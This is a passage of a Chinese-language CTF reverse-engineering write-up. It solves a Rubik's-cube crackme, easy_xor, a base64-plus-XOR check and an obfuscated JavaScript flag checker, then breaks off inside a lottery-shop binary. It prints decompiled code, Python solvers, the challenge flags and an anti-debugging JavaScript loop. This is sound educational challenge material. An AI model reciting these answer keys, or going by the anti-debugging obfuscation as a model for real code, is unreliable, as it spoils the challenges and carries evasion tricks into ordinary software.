&lt;回车&gt;,每步操作用空格分开,逆时针加上’字符 flag格式为xsctf{formula},其中formula为4个魔方的还原步骤依次连在一起,去掉空格,取其md5 本题在Ubuntu22下编译,请不要使用ubuntu18 6个面，一共24种旋转操作，分析时需要对号入座 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [rsp+Bh] [rbp-3B5h] int v5; // [rsp+Ch] [rbp-3B4h] char v6[160]; // [rsp+10h] [rbp-3B0h] BYREF int v7[40]; // [rsp+B0h] [rbp-310h] BYREF char v8[160]; // [rsp+150h] [rbp-270h] BYREF int v9[114]; // [rsp+1F0h] [rbp-1D0h] BYREF unsigned __int64 v10; // [rsp+3B8h] [rbp-8h] v10 = __readfsqword(0x28u); cube_init((__int64)v9); print_menu(v9, argv); v4 = getchar(); getchar(); if ( v4 &lt;= &#x27;0&#x27; || v4 &gt; 52 ) &#123; if ( v4 == 53 ) puts(&quot;bye!&quot;); else puts(&quot;error!&quot;); &#125; else &#123; formula_get_by_id((__int64)v6, v4 - 48); cube_scramble((__int64)v9, (__int64)v6); cube_print((unsigned int *)v9); v5 = 0; formula_input((char *)v7); while ( v7[v5] != 24 ) cube_rotating((__int64)v9, v7[v5++]); cube_print((unsigned int *)v9); formula_reverse(v7, v8); if ( !(unsigned int)cube_isorigin(v9) || (unsigned int)formula_cmp(v6, v8) ) &#123; if ( (unsigned int)cube_isorigin(v9) &amp;&amp; (unsigned int)formula_cmp(v6, v8) ) puts(&quot;Restore successfully!!!But not reverse!!!&quot;); else puts(&quot;Restore failed!!!&quot;); &#125; else &#123; puts(&quot;Restore successfully!!!You reversed the formula!!!&quot;); &#125; &#125; printf(&quot;press anykey to continue...&quot;); getchar(); return 0;&#125; 运行是这样的 1234567891011121314151617181920212223242526272829303132333435363738394041~$ .&#x2F;cube3 三阶魔方 _______________________________________________ | | | 请输入编号: | | 1.打乱1 2.打乱2 | | 3.打乱3 4.打乱4 | | 5.退出程序 | | | | | ----------------------------------------------- 请输入编号[1&#x2F;2]:4 ________________ | 2 | 3 | 3 | +----+----+----+ | 2 | 4 | 4 | +----+----+----+ | 5 | 3 | 6 | +----+----+----+ &#x2F; 4 &#x2F; 5 &#x2F; 1 &#x2F;| &#x2F;____&#x2F;____&#x2F;____&#x2F; | &#x2F; 1 &#x2F; 1 &#x2F; 6 &#x2F;|3+ &#x2F;____&#x2F;____&#x2F;____&#x2F; |&#x2F;| &#x2F; 3 &#x2F; 5 &#x2F; 1 &#x2F;|1|1| ______________&#x2F;____&#x2F;____&#x2F;____&#x2F;4|&#x2F;|&#x2F;| | 1 | 5 | 5 | 2 | 4 | 6 |&#x2F;|6+1| +---+----+----+----+----+----+6|&#x2F;|&#x2F; | 5 | 5 | 2 | 6 | 3 | 3 |&#x2F;|6+ +---+----+----+----+----+----+2|&#x2F; | 6 | 2 | 3 | 6 | 3 | 5 |&#x2F; +---+----+----+----+----+----+ | 2 | 1 | 4 | +----+----+----+ | 4 | 2 | 4 | +----+----+----+ | 4 | 2 | 5 | +----+----+----+Enter a formula and separate each step with a spaceTip: The format of the operation is like R2 R2&#39; R[&#39;] represents a counterclockwise rotation&gt;&gt;&gt; 需要输入魔方的公式【初级篇】三阶魔方入门教程 - 知乎 (zhihu.com) 要还原魔方，最简单的方法是反着拧要反着拧，就要找到打乱的顺序 ida大部分函数看不懂没关系，可以凭感觉找到存储打乱顺序的变量 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596unsigned __int64 __fastcall formula_get_by_id(__int64 a1, int a2)&#123; int i; // [rsp+1Ch] [rbp-294h] int v4[162]; // [rsp+20h] [rbp-290h] BYREF unsigned __int64 v5; // [rsp+2A8h] [rbp-8h] v5 = __readfsqword(0x28u); memset(v4, 0, 0x280uLL); v4[0] = 23; v4[1] = 3; v4[2] = 4; v4[3] = 8; v4[4] = 18; v4[5] = 9; v4[6] = 12; v4[7] = 18; v4[8] = 13; v4[9] = 7; v4[10] = 20; v4[11] = 11; v4[12] = 13; v4[13] = 22; v4[14] = 14; v4[15] = 6; v4[16] = 8; v4[17] = 18; v4[18] = 4; v4[19] = 14; v4[20] = 24; v4[40] = 6; v4[41] = 22; v4[42] = 7; v4[43] = 13; v4[44] = 1; v4[45] = 4; v4[46] = 2; v4[47] = 8; v4[48] = 22; v4[49] = 19; v4[50] = 6; v4[51] = 10; v4[52] = 19; v4[53] = 21; v4[54] = 19; v4[55] = 7; v4[56] = 17; v4[57] = 8; v4[58] = 7; v4[59] = 12; v4[60] = 24; v4[80] = 5; v4[81] = 15; v4[82] = 19; v4[83] = 2; v4[84] = 5; v4[85] = 17; v4[86] = 12; v4[87] = 9; v4[88] = 7; v4[89] = 12; v4[90] = 18; v4[91] = 5; v4[92] = 12; v4[93] = 3; v4[94] = 11; v4[95] = 14; v4[96] = 5; v4[97] = 18; v4[98] = 6; v4[99] = 22; v4[100] = 24; v4[120] = 20; v4[121] = 12; v4[122] = 7; v4[123] = 21; v4[124] = 14; v4[125] = 23; v4[126] = 19; v4[127] = 13; v4[128] = 3; v4[129] = 18; v4[130] = 7; v4[131] = 3; v4[132] = 0x16; v4[134] = 8; v4[135] = 1; v4[136] = 0x12; v4[137] = 7; v4[138] = 0x12; v4[139] = 0xB; v4[140] = 0x18; for ( i = 0; v4[40 * a2 - 40 + i] != 24; ++i ) *(_DWORD *)(a1 + 4LL * i) = v4[40 * a2 - 40 + i]; *(_DWORD *)(4LL * i + a1) = 24; return v5 - __readfsqword(0x28u);&#125; 因为题目说一共有24种操作，刚好是v4元素的取值范围-1减一的原因是因为有四个魔方，最大的元素（24）的作用类似分隔符，通过主函数的while语句也可以判断出来，而且整个v4数组刚好被值为24的元素分隔成4部分，刚好对应4个魔方 因此可以将这些元素提取出来（有坑），然后映射到对应的公式，再反着输出就行 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849s = open(&#x27;./tmp.txt&#x27;, &#x27;r&#x27;).readlines()print(len(s))ss = []for i in s: num = &#x27;&#x27; for j in range(len(i)): if i[j] == &#x27;=&#x27;: num = i[j+1:-2] ss.append(int(num))rotate = [ &#x27;U&#x27;, &#x27;U\\&#x27;&#x27;, &#x27;U2&#x27;, &#x27;U2\\&#x27;&#x27;, &#x27;D&#x27;, &#x27;D\\&#x27;&#x27;, &#x27;D2&#x27;, &#x27;D2\\&#x27;&#x27;, &#x27;F&#x27;, &#x27;F\\&#x27;&#x27;, &#x27;F2&#x27;, &#x27;F2\\&#x27;&#x27;, &#x27;B&#x27;, &#x27;B\\&#x27;&#x27;, &#x27;B2&#x27;, &#x27;B2\\&#x27;&#x27;, &#x27;L&#x27;, &#x27;L\\&#x27;&#x27;, &#x27;L2&#x27;, &#x27;L2\\&#x27;&#x27;, &#x27;R&#x27;, &#x27;R\\&#x27;&#x27;, &#x27;R2&#x27;, &#x27;R2\\&#x27;&#x27;]for i in ss: if i == 24: print() else: print(rotate[i], end=&#x27; &#x27;)for i in range(len(ss)-1, -1, -1): if ss[i] == 24: print() else: if &#x27;\\&#x27;&#x27; in rotate[ss[i]]: print(rotate[ss[i]-1], end=&#x27; &#x27;) else: print(rotate[ss[i]+1], end=&#x27; &#x27;)print()sss = &#x27;&#x27;&#x27;B2&#x27; D&#x27; L2&#x27; F&#x27; D2&#x27; B2&#x27; R2&#x27; B F2 R&#x27; D2 B L2&#x27; B&#x27; F L2&#x27; F&#x27; D&#x27; U2 R2B&#x27; D2 F&#x27; L D2 L2 R L2 F2&#x27; D2&#x27; L2 R2&#x27; F&#x27; U2&#x27; D&#x27; U B D2 R2&#x27; D2&#x27;R2&#x27; D2&#x27; L2&#x27; D B2&#x27; F2 U2 B&#x27; D L2&#x27; B&#x27; D2 F B&#x27; L D U2&#x27; L2 B2 DF2 L2&#x27; D2 L2&#x27; U F&#x27; U&#x27; R2&#x27; U2 D2 L2&#x27; U2 B L2 R2 B2&#x27; R D2 B&#x27; R&#x27;&#x27;&#x27;&#x27;ssss = &#x27;&#x27;for i in sss: if i != &#x27; &#x27; and i != &#x27;\\n&#x27;: ssss += iprint(ssss) 这样就可以得到四个魔方的解法，可以使用程序验证，最后再将解法按照题目要求处理就行 xsctf&#123;0a15a3168e6bf08df8178186312b0396&#125; 坑 v4数组的定义种少了一个元素v4[133]，需要动态调试得到这个元素的值 因为是4个魔方一起反着输出，所以第一个魔方的解法应该对应第四行的输出 最后串起来的时候是第一个魔方的解法+第二个魔方的解法...，即第四行+第三行+… easy_xor核心代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // eax char v4; // al int v5; // eax char v7; // [rsp+33h] [rbp-Dh] char v8; // [rsp+33h] [rbp-Dh] int v9; // [rsp+34h] [rbp-Ch] int i; // [rsp+38h] [rbp-8h] int v11; // [rsp+3Ch] [rbp-4h] _main(); v11 = 0; v9 = 0; puts(&quot;Please input your flag:&quot;); while ( 1 ) &#123; v8 = getchar(); if ( v8 == 10 ) break; v7 = key[v9 % 4] ^ v8; while ( 1 ) &#123; v4 = v7--; if ( v4 &lt;= 0 ) break; v3 = v11++; s[v3] = 1; &#125; v5 = v11++; s[v5] = 0; ++v9; &#125; while ( v11 &lt;= 2559 ) s[v11++] = -1; for ( i = 0; i &lt;= 2559; ++i ) &#123; if ( r[i] != s[i] ) &#123; puts(&quot;Lose lose lose!&quot;); break; &#125; &#125; if ( i == 2560 ) puts(&quot;Win win win!&quot;); system(&quot;pause&quot;); return 0;&#125; 其中数组r是在运行时生成的，因此需要使用动态调试 大概的逻辑是： 接收输入直到回车符 计算每个字符异或的结果 异或的结果是多少，就在数组中添加多少个1，然后添加一个0 对比两个数组的差异 因此解密的逻辑就是 拿到目标数组 遍历数组中1的个数，直到遇到数字0 将以上1的个数循环异或key的元素 转换为字符输出 重复2到4，直到遇到-1 exp.py 1234567891011121314151617s = [...]ch = []key_index = 0key = &#x27;SCNU&#x27;c = 0for i in s: if i == 1: c += 1 elif i == 0: # print(hex(c), end=&#x27;&#x27;) ch.append(chr(c^ord(key[key_index%4]))) key_index += 1 c = 0 else: breakprint(&#x27;&#x27;.join(ch)) flag&#123;Winn3r_n0t_L0s3r_#&#125; eazy_64x123456789101112131415161718192021222324252627282930313233343536373839404142434445464748int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+8h] [rbp-98h] int v5; // [rsp+Ch] [rbp-94h] int i; // [rsp+10h] [rbp-90h] int v7; // [rsp+14h] [rbp-8Ch] int v8; // [rsp+1Ch] [rbp-84h] char *v9; // [rsp+20h] [rbp-80h] char dest[4]; // [rsp+2Ch] [rbp-74h] BYREF char s[104]; // [rsp+30h] [rbp-70h] BYREF unsigned __int64 v12; // [rsp+98h] [rbp-8h] v12 = __readfsqword(0x28u); memset(s, 0, 0x64uLL); __isoc99_scanf(&amp;unk_222C, s); v7 = strlen(s); if ( v7 == 20 ) &#123; v4 = 0; v5 = 0; while ( v7 / 3 &gt;= v4 ) &#123; memset(dest, 0, sizeof(dest)); memcpy(dest, &amp;s[v5], 3uLL); v9 = encrypt(dest); v8 = strlen(v9); get_trans(v9); for ( i = 0; i &lt; v8; ++i ) &#123; if ( v9[i] != glob[4 * v4 + i] ) &#123; puts(&quot;Oh,no!&quot;); return 0; &#125; &#125; free(v9); ++v4; v5 += 3; &#125; printf(&quot;Good!&quot;); return 0; &#125; else &#123; printf(&quot;sorry!&quot;); return 0; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041_BYTE *__fastcall encrypt(const char *a1)&#123; int v2; // [rsp+10h] [rbp-70h] int v3; // [rsp+14h] [rbp-6Ch] __int64 v4; // [rsp+18h] [rbp-68h] signed __int64 v5; // [rsp+20h] [rbp-60h] _BYTE *v6; // [rsp+28h] [rbp-58h] char v7[72]; // [rsp+30h] [rbp-50h] BYREF unsigned __int64 v8; // [rsp+78h] [rbp-8h] v8 = __readfsqword(0x28u); strcpy(v7, &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;); v5 = strlen(a1); if ( v5 % 3 ) v4 = 4 * (v5 / 3 + 1); else v4 = 4 * (v5 / 3); v6 = malloc(v4 + 1); v6[v4] = 0; v2 = 0; v3 = 0; while ( v2 &lt; v4 - 2 ) &#123; v6[v2] = v7[(unsigned __int8)a1[v3] &gt;&gt; 2]; v6[v2 + 1] = v7[((unsigned __int8)a1[v3 + 1] &gt;&gt; 4) | (16 * a1[v3]) &amp; &#x27;0&#x27;]; v6[v2 + 2] = v7[((unsigned __int8)a1[v3 + 2] &gt;&gt; 6) | (4 * a1[v3 + 1]) &amp; 0x3C]; v6[v2 + 3] = v7[a1[v3 + 2] &amp; 0x3F]; v3 += 3; v2 += 4; &#125; if ( v5 % 3 == 1 ) &#123; v6[v2 - 2] = 61; v6[v2 - 1] = 61; &#125; else if ( v5 % 3 == 2 ) &#123; v6[v2 - 1] = 61; &#125; return v6;&#125; 看到这里觉得是base64，也有可能是换表base64，但是解不出来，接着看 1234567891011121314size_t __fastcall get_trans(const char *a1)&#123; size_t result; // rax int i; // [rsp+1Ch] [rbp-14h] for ( i = 0; ; ++i ) &#123; result = strlen(a1); if ( i &gt;= result ) break; a1[i] ^= 0x68u; &#125; return result;&#125; 在类似base编码之后还加了异或 思路： 异或还原 base64 exp 123456789import base64s = [0x32, 0x05, 0x10, 0x00, 0x32, 0x5B, 0x1B, 0x10, 0x30, 0x5A, 0x1F, 0x1F, 0x0C, 0x05, 0x3E, 0x0E, 0x0B, 0x05, 0x3E, 0x5A, 0x32, 0x3C, 0x21, 0x59, 0x32, 0x30, 0x58, 0x55]ss = &#x27;&#x27;for i in s: ss += chr(i^0x68) print(base64.b64decode(ss)) flag&#123;1_l0ve_reve25e&#125; JSNEWNEW一个html内嵌经过混淆的js代码 1((()=&gt;&#123;function _0x139d2b()&#123;setInterval(()=&gt;&#123;(function()&#123;return![]&#125;[&#x27;constructor&#x27;](&#x27;debugger&#x27;)[&#x27;call&#x27;]())&#125;,0x32)&#125;try&#123;_0x139d2b()&#125;catch(_0x536807)&#123;&#125;&#125;)());function _Y0u(_0x5093c8,_0x291ad5)&#123;return _0x5093c8+_0x291ad5&#125;function _C4n(_0x4277b8)&#123;return _0x4277b8&amp;0xff&#125;function _N3v3r(_0x414184,_0x29df09)&#123;return _C4n(_0x414184^_0x29df09)&#125;function _G37(_0x500f65,_0x1ddb85)&#123;return _C4n(_0x500f65|_0x1ddb85)&#125;function _Th15(_0x1621d6,_0x285fc7)&#123;return _C4n(_0x1621d6&amp;_0x285fc7)&#125;function _H4(_0x2abb65)&#123;return _C4n(~_0x2abb65)&#125;function _H4H4(_0x5b22bc)&#123;return _C4n(_H4H4H4(_H4(_0x5b22bc),_H4H4H4([],0x1)))&#125;function _H4H4H4(_0x431cb1,_0x516603)&#123;return _C4n((_H4(_G37(_H4(_Y0u(_0x431cb1,_0x516603)),_H4(_Y0u(_0x431cb1,_0x516603)))),_H4(_G37(_H4(_Y0u(_0x431cb1,_0x516603)),_H4(_Y0u(_0x431cb1,_0x516603))))))&#125;function _H4H4H4H4(_0x1b81b8,_0x11e8ab,_0x2c730f)&#123;return a=_H4H4H4(_0x1b81b8,_0x2c730f),a=_H4H4H4(a,_H4H4(_0x11e8ab)),a=_H4H4H4(a,_H4H4(_0x2c730f)),_C4n(a)&#125;function _G00D(_0x51eb06)&#123;((()=&gt;&#123;function _0x139d2b()&#123;setInterval(()=&gt;&#123;(function()&#123;return![]&#125;[&#x27;constructor&#x27;](&#x27;debugger&#x27;)[&#x27;call&#x27;]())&#125;,0x32)&#125;try&#123;_0x139d2b()&#125;catch(_0x536807)&#123;&#125;&#125;)());var _0x8b9e29=document[&#x27;getElementById&#x27;](&#x27;passwordError&#x27;);_0xcaf3caf3=[],_0xc4f3c4f3=[0x55,0xbf,0x63,0xbc,0x33,0x95,0x31,0x4c,0x89,0x6b,0x49,0x31,0x30,0xdf,0x63,0xe5,0x57,0xd7,0x73,0xa6,0x6e,0xd3,0x63,0xa1,0x92,0x5b,0x72,0xe6,0x8f,0x76,0x4f,0xd0],Hur1k=&#x27;Hur1k&#x27;;if(_0x51eb06[&#x27;length&#x27;]!=0x27)return _0x8b9e29[&#x27;textContent&#x27;]=&#x27;错误的&#x27;,![];if(_0x51eb06[&#x27;substr&#x27;](0x0,0x6)!=&#x27;XSCTF&#123;&#x27;)return _0x8b9e29[&#x27;textContent&#x27;]=&#x27;错误的&#x27;,![];if(_0x51eb06[0x26]!=&#x27;&#125;&#x27;)return _0x8b9e29[&#x27;textContent&#x27;]=&#x27;错误的&#x27;,![];_0x114514=_0x51eb06[&#x27;substr&#x27;](0x6,0x20),_0x51eb06=[];for(var _0x28db6c=0x0;_0x28db6c&lt;_0x114514[&#x27;length&#x27;];_0x28db6c++)&#123;_0x51eb06[&#x27;push&#x27;](_0x114514[&#x27;charCodeAt&#x27;](_0x28db6c))&#125;Math[&#x27;seed&#x27;]=new Date()[&#x27;getTime&#x27;](),Math[&#x27;seededRandom&#x27;]=function(_0x14b0c9,_0x56fb11)&#123;_0x56fb11=_0x56fb11||0x1,_0x14b0c9=_0x14b0c9||0x0,Math[&#x27;seed&#x27;]=(Math[&#x27;seed&#x27;]*0x2455+0xc091)%0x38f40;var _0xee8b23=Math[&#x27;seed&#x27;]/0x38f40;return parseInt(_0x14b0c9+_0xee8b23*(_0x56fb11-_0x14b0c9))&#125;;var _0xe5731c=Math[&#x27;seededRandom&#x27;](0x0,0x100);for(var _0x28db6c=0x0;_0x28db6c&lt;_0x51eb06[&#x27;length&#x27;];_0x28db6c+=0x2)&#123;tmp=_H4H4H4(_0x51eb06[_0x28db6c],_0x28db6c)^_0x28db6c,_0xcaf3caf3[&#x27;push&#x27;](tmp),randNum=Math[&#x27;seededRandom&#x27;](0x0,0x100),Math[&#x27;seed&#x27;]=randNum,tmp=_H4H4H4H4(tmp^_0x51eb06[_0x28db6c+0x1],Hur1k[&#x27;charCodeAt&#x27;]([_0x28db6c/0x2%Hur1k[&#x27;length&#x27;]]),randNum),_0xcaf3caf3[&#x27;push&#x27;](tmp)&#125;((()=&gt;&#123;function _0x139d2b()&#123;setInterval(()=&gt;&#123;(function()&#123;return![]&#125;[&#x27;constructor&#x27;](&#x27;debugger&#x27;)[&#x27;call&#x27;]())&#125;,0x32)&#125;try&#123;_0x139d2b()&#125;catch(_0x536807)&#123;&#125;&#125;)());if(_0xcaf3caf3[&#x27;length&#x27;]!=0x20)return _0x8b9e29[&#x27;textContent&#x27;]=&#x27;究极错误的&#x27;,![];for(var _0x28db6c=0x0;_0x28db6c&lt;_0xcaf3caf3[&#x27;length&#x27;];_0x28db6c++)&#123;if(_0xcaf3caf3[_0x28db6c]!=_0xc4f3c4f3[_0x28db6c])return _0x8b9e29[&#x27;textContent&#x27;]=&#x27;错误的&#x27;,![]&#125;return!![]&#125; 首先经过Obfuscator.io Deobfuscator (deobfuscate.io)，初步解混淆再通过JavaScript Deobfuscator (deobfuscate.io)，再解一次然后就解不动了（不排除有其他工具） 解混淆的结果 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596(() =&gt; &#123; function _0x139d2b() &#123; setInterval(() =&gt; &#123; (function () &#123; return false; &#125;.constructor(&quot;debugger&quot;).call()); &#125;, 50); &#125; try &#123; _0x139d2b(); &#125; catch (_0x536807) &#123;&#125;&#125;)();function _H4H4H4(_0x431cb1, _0x516603) &#123; ~((~(_0x431cb1 + _0x516603) &amp; 255 | ~(_0x431cb1 + _0x516603) &amp; 255) &amp; 255) &amp; 255; return ~((~(_0x431cb1 + _0x516603) &amp; 255 | ~(_0x431cb1 + _0x516603) &amp; 255) &amp; 255) &amp; 255 &amp; 255;&#125;function _H4H4H4H4(_0x1b81b8, _0x11e8ab, _0x2c730f) &#123; a = _H4H4H4(_0x1b81b8, _0x2c730f); a = _H4H4H4(a, _H4H4H4(~_0x11e8ab &amp; 255, _H4H4H4([], 1)) &amp; 255); a = _H4H4H4(a, _H4H4H4(~_0x2c730f &amp; 255, _H4H4H4([], 1)) &amp; 255); return a &amp; 255;&#125;function _G00D(_0x51eb06) &#123; (() =&gt; &#123; function _0x139d2b() &#123; setInterval(() =&gt; &#123; (function () &#123; return false; &#125;.constructor(&quot;debugger&quot;).call()); &#125;, 50); &#125; try &#123; _0x139d2b(); &#125; catch (_0x536807) &#123;&#125; &#125;)(); var _0x8b9e29 = document.getElementById(&quot;passwordError&quot;); _0xcaf3caf3 = []; _0xc4f3c4f3 = [85, 191, 99, 188, 51, 149, 49, 76, 137, 107, 73, 49, 48, 223, 99, 229, 87, 215, 115, 166, 110, 211, 99, 161, 146, 91, 114, 230, 143, 118, 79, 208]; Hur1k = &quot;Hur1k&quot;; if (_0x51eb06.length != 39) &#123; _0x8b9e29.textContent = &quot;错误的&quot;; return false; &#125; if (_0x51eb06.substr(0, 6) != &quot;XSCTF&#123;&quot;) &#123; _0x8b9e29.textContent = &quot;错误的&quot;; return false; &#125; if (_0x51eb06[38] != &quot;&#125;&quot;) &#123; _0x8b9e29.textContent = &quot;错误的&quot;; return false; &#125; _0x114514 = _0x51eb06.substr(6, 32); _0x51eb06 = []; for (var _0x28db6c = 0; _0x28db6c &lt; _0x114514.length; _0x28db6c++) &#123; _0x51eb06.push(_0x114514.charCodeAt(_0x28db6c)); &#125; Math.seed = (new Date).getTime(); Math.seededRandom = function (_0x14b0c9, _0x56fb11) &#123; _0x56fb11 = _0x56fb11 || 1; _0x14b0c9 = _0x14b0c9 || 0; Math.seed = (Math.seed * 9301 + 49297) % 233280; var _0xee8b23 = Math.seed / 233280; return parseInt(_0x14b0c9 + _0xee8b23 * (_0x56fb11 - _0x14b0c9)); &#125;; for (var _0x28db6c = 0; _0x28db6c &lt; _0x51eb06.length; _0x28db6c += 2) &#123; tmp = _H4H4H4(_0x51eb06[_0x28db6c], _0x28db6c) ^ _0x28db6c; _0xcaf3caf3.push(tmp); randNum = Math.seededRandom(0, 256); Math.seed = randNum; tmp = _H4H4H4H4(tmp ^ _0x51eb06[_0x28db6c + 1], Hur1k.charCodeAt([_0x28db6c / 2 % Hur1k.length]), randNum); _0xcaf3caf3.push(tmp); &#125; (() =&gt; &#123; function _0x139d2b() &#123; setInterval(() =&gt; &#123; (function () &#123; return false; &#125;.constructor(&quot;debugger&quot;).call()); &#125;, 50); &#125; try &#123; _0x139d2b(); &#125; catch (_0x536807) &#123;&#125; &#125;)(); if (_0xcaf3caf3.length != 32) &#123; _0x8b9e29.textContent = &quot;究极错误的&quot;; return false; &#125; for (var _0x28db6c = 0; _0x28db6c &lt; _0xcaf3caf3.length; _0x28db6c++) &#123; if (_0xcaf3caf3[_0x28db6c] != _0xc4f3c4f3[_0x28db6c]) &#123; _0x8b9e29.textContent = &quot;错误的&quot;; return false; &#125; &#125; return true;&#125; 然后就是手动解 从目标数组入手回溯 查看对目标数组操作的函数，尝试逆向 逆向不出来怎么办，把函数复制到控制台，传入简单的参数，然后逐个修改参数，观察函数输出 根据这个方法可以推测出_H4H4H4的实际作用是相加，_H4H4H4H4的实际功能是前两个参数相减，第三个参数是摆设 涉及到随机数的参数大概率没什么用 最后手动解混淆的结果 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899(() =&gt; &#123; function _0x139d2b() &#123; setInterval(() =&gt; &#123; (function () &#123; return false; &#125;.constructor(&quot;debugger&quot;).call()); &#125;, 50); &#125; try &#123; _0x139d2b(); &#125; catch (_0x536807) &#123;&#125;&#125;)();function add(_0x431cb1, _0x516603) &#123; ~((~(_0x431cb1 + _0x516603) &amp; 255 | ~(_0x431cb1 + _0x516603) &amp; 255) &amp; 255) &amp; 255; return ~((~(_0x431cb1 + _0x516603) &amp; 255 | ~(_0x431cb1 + _0x516603) &amp; 255) &amp; 255) &amp; 255 &amp; 255;&#125;function sub(h_a, h_b, h_c) &#123; a = h_a + h_c + (((~h_b &amp; 255) + 1)&amp;255) + (((~h_c &amp; 255) + 1)&amp;255) a = h_a + h_c + 256-h_b + 256-h_c a = 512 + h_a - h_b // a = add(h_a, h_c); // a = add(a, add(~h_b &amp; 255, 1) &amp; 255); // a = add(a, add(~h_c &amp; 255, 1) &amp; 255); return a &amp; 255;&#125;function _G00D(userinput) &#123; (() =&gt; &#123; function _0x139d2b() &#123; setInterval(() =&gt; &#123; (function () &#123; return false; &#125;.constructor(&quot;debugger&quot;).call()); &#125;, 50); &#125; try &#123; _0x139d2b(); &#125; catch (_0x536807) &#123;&#125; &#125;)(); var pass_err = document.getElementById(&quot;passwordError&quot;); userin = []; target = [85, 191, 99, 188, 51, 149, 49, 76, 137, 107, 73, 49, 48, 223, 99, 229, 87, 215, 115, 166, 110, 211, 99, 161, 146, 91, 114, 230, 143, 118, 79, 208]; Hur1k = &quot;Hur1k&quot;; if (userinput.length != 39) &#123; pass_err.textContent = &quot;错误的&quot;; return false; &#125; if (userinput.substr(0, 6) != &quot;XSCTF&#123;&quot;) &#123; pass_err.textContent = &quot;错误的&quot;; return false; &#125; if (userinput[38] != &quot;&#125;&quot;) &#123; pass_err.textContent = &quot;错误的&quot;; return false; &#125; in_slice = userinput.substr(6, 32); userinput = []; for (var i = 0; i &lt; in_slice.length; i++) &#123; userinput.push(in_slice.charCodeAt(i)); &#125; Math.seed = (new Date).getTime(); Math.seededRandom = function (p_a, p_b) &#123; p_b = p_b || 1; p_a = p_a || 0; Math.seed = (Math.seed * 9301 + 49297) % 233280; var p_seed = Math.seed / 233280; return parseInt(p_a + p_seed * (p_b - p_a)); &#125;; for (var i = 0; i &lt; userinput.length; i += 2) &#123; tmp = add(userinput[i], i) ^ i; userin.push(tmp); randNum = Math.seededRandom(0, 256); Math.seed = randNum; tmp = sub(tmp ^ userinput[i + 1], Hur1k.charCodeAt([i / 2 % Hur1k.length]), randNum); userin.push(tmp); &#125; (() =&gt; &#123; function _0x139d2b() &#123; setInterval(() =&gt; &#123; (function () &#123; return false; &#125;.constructor(&quot;debugger&quot;).call()); &#125;, 50); &#125; try &#123; _0x139d2b(); &#125; catch (_0x536807) &#123;&#125; &#125;)(); if (userin.length != 32) &#123; pass_err.textContent = &quot;究极错误的&quot;; return false; &#125; for (var i = 0; i &lt; userin.length; i++) &#123; if (userin[i] != target[i]) &#123; pass_err.textContent = &quot;错误的&quot;; return false; &#125; &#125; return true;&#125; exp.py 12345678910Hur1k = &quot;Hur1k&quot;s = [85, 191, 99, 188, 51, 149, 49, 76, 137, 107, 73, 49, 48, 223, 99, 229, 87, 215, 115, 166, 110, 211, 99, 161, 146, 91, 114, 230, 143, 118, 79, 208]charCode = [0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 0, 0]for i in range(30, -1, -2): s[i+1] = ((s[i+1]+ord(Hur1k[charCode[i]]))&amp;255)^s[i] s[i] = (s[i]^i)-ifor i in s: print(chr(i), end=&#x27;&#x27;) UR_R341Ly_900d_47_Obfu_ur_Newn3W 一些解混淆的网站 Obfuscator.io Deobfuscator (deobfuscate.io) JavaScript Deobfuscator (deobfuscate.io) 主页 - DeJs JavaScript Deobfuscator (relative.im) 工具 v_jstools（浏览器插件，需配置） – 网页 js 逆向分析 ( v_jstools )、jshook ( 安卓上用js实现Hook )-CSDN博客 lotery shop核心代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495void __noreturn sub_140017AC0()&#123; char *v0; // rdi __int64 i; // rcx char v2; // [rsp+60h] [rbp+0h] BYREF char v3[80]; // [rsp+68h] [rbp+8h] BYREF char v4[80]; // [rsp+B8h] [rbp+58h] BYREF char v5[96]; // [rsp+108h] [rbp+A8h] BYREF char v6[80]; // [rsp+168h] [rbp+108h] BYREF int v7[20]; // [rsp+1B8h] [rbp+158h] BYREF int v8[20]; // [rsp+208h] [rbp+1A8h] BYREF int v9[20]; // [rsp+258h] [rbp+1F8h] BYREF int v10[20]; // [rsp+2A8h] [rbp+248h] BYREF char v11[76]; // [rsp+2F8h] [rbp+298h] BYREF int v12[8]; // [rsp+344h] [rbp+2E4h] BYREF int v13[19]; // [rsp+364h] [rbp+304h] BYREF char v14[180]; // [rsp+3B0h] [rbp+350h] BYREF int v15[148]; // [rsp+464h] [rbp+404h] BYREF int v16; // [rsp+6B4h] [rbp+654h] v0 = &amp;v2; for ( i = 266i64; i; --i ) &#123; *(_DWORD *)v0 = -858993460; v0 += 4; &#125; sub_140011690(&amp;unk_14002D06A); v13[0] = 0; v13[8] = 10; j_memset(v14, 0, 30ui64); v15[0] = 0; sub_14001117C(v3, &quot;Sloth&#x27;s lottery shop is open!&quot;); sub_14001117C(v4, &quot;You&#x27;re our first customer!&quot;); sub_1400114CE(v5, &quot;We will give you a free lottery ticket, the number is: &quot;); sub_14001117C(v6, &quot;Please enter your choice &#123;1-5&#125;&quot;); sub_14001117C(v7, &quot;1.buy a lottery ticket&quot;); sub_14001117C(v8, &quot;2.Check to see if you won&quot;); sub_14001117C(v9, &quot;3.join us&quot;); sub_14001117C(v10, &quot;4.Take a sneak peek at the flag&quot;); sub_14001117C(v11, &quot;5.exit&quot;); sub_1400110FF( (int)v3, (int)v4, (int)v5, (int)v6, (__int64)v7, (__int64)v8, (__int64)v9, (__int64)v10, (__int64)v11, (__int64)v13, (__int64)v15, (__int64)v14); while ( 1 ) &#123; while ( 1 ) &#123; sub_14001156E((int)v7, (int)v8, (int)v9, 